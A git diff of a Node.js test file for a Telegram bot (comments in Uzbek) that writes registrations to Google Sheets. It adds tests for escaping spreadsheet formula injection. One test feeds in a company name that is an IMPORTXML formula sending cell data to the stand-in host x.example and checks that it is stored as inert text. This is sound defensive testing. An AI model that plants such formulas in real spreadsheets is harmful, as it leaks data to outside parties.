@@ -1,6 +1,6 @@
 import assert from 'node:assert/strict';
 import { afterEach, beforeEach, test } from 'node:test';
-import { sheetsKey } from '../src/sheets.js';
+import { sheetText, sheetsKey } from '../src/sheets.js';
 import { TOKEN, createEnv, fakeTelegram, press, registerBlogger, registerBusiness, say, shareContact, tgUser } from './helpers.js';
 
 const SHEETS_URL = 'https://script.google.com/macros/s/TEST/exec';
@@ -38,13 +38,24 @@ test('yangi bloger jadvalning "Blogerlar" varag‘iga yoziladi', async () => {
   assert.equal(post.row.Havola, 'https://instagram.com/dilnoza.blog');
   assert.match(post.row.Obunachilar, /10\s000 – 50\s000/);
   assert.match(post.row.Engagement, /Reels \(o‘rtacha\): 5\s000 – 20\s000/);
-  assert.equal(post.row['Ochiq aloqa'], '+998 93 555 66 77; @dilnoza_tg');
+  // "+" bilan boshlangani uchun Sheets formula deb o'qimasin: boshida ' (jadvalda ko'rinmaydi)
+  assert.equal(post.row['Ochiq aloqa'], "'+998 93 555 66 77; @dilnoza_tg");
   assert.equal(post.row.Manba, 'Telegram bot');
   assert.equal(post.row.Izoh, 'Telegram ID: 1700');
   assert.ok(post.row.Soha);
   assert.ok(post.row.Shahar);
   // Sana va Holat ni jadval (Apps Script) o'zi qo'yadi
   assert.equal(post.row.Holat, undefined);
+});
+
+test('formula bilan boshlangan nom jadvalga oddiy matn bo‘lib yoziladi', async () => {
+  await registerBusiness(env, tgUser(1720), { company: '=IMPORTXML("https://x.example/?"&A1;"//a")' });
+
+  assert.equal(posts.length, 1);
+  assert.equal(posts[0].row.Nomi, `'=IMPORTXML("https://x.example/?"&A1;"//a")`);
+  assert.equal(sheetText('@cmd'), "'@cmd");
+  assert.equal(sheetText('-1+2'), "'-1+2");
+  assert.equal(sheetText('Zaytun'), 'Zaytun');
 });
 
 test('yangi biznes "Brendlar" varag‘iga yoziladi', async () => {
